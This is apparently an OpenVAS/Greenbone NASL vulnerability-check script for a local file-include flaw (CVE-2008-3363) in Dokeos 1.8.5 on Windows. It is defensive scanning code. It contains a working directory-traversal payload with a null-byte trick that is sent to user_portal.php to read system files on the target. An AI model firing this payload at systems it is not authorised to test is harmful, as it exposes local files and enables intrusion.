CPE = "cpe:/a:dokeos:dokeos";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100155" );
	script_version( "2021-08-11T10:41:15+0000" );
	script_tag( name: "last_modification", value: "2021-08-11 10:41:15 +0000 (Wed, 11 Aug 2021)" );
	script_tag( name: "creation_date", value: "2009-04-23 21:21:19 +0200 (Thu, 23 Apr 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2008-3363" );
	script_bugtraq_id( 30150 );
	script_tag( name: "solution_type", value: "Workaround" );
	script_name( "Dokeos <= 1.8.5 'user_portal.php' Local File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "gb_dokeos_http_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "dokeos/http/detected", "Host/runs_windows" );
	script_tag( name: "summary", value: "Dokeos is prone to a local file-include vulnerability because it fails to
  properly sanitize user-supplied input." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view local files or
  execute arbitrary local scripts on the vulnerable computer in the context of the webserver process." );
	script_tag( name: "affected", value: "Dokeos 1.8.5 is vulnerable, other versions may also be affected.

  Please note that this issue affects only Dokeos running on Windows." );
	script_tag( name: "solution", value: "The vendor has provided a workaround to mitigate this
  vulnerability. Please see the references for more information." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/30150" );
	script_xref( name: "URL", value: "https://web.archive.org/web/20100102111721/http://www.dokeos.com/wiki/index.php/Security#Dokeos_1.8.5" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "windows" );
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/user_portal.php?include=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\" + file + "%00.ht";
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!buf){
		continue;
	}
	if(egrep( pattern: pattern, string: buf )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

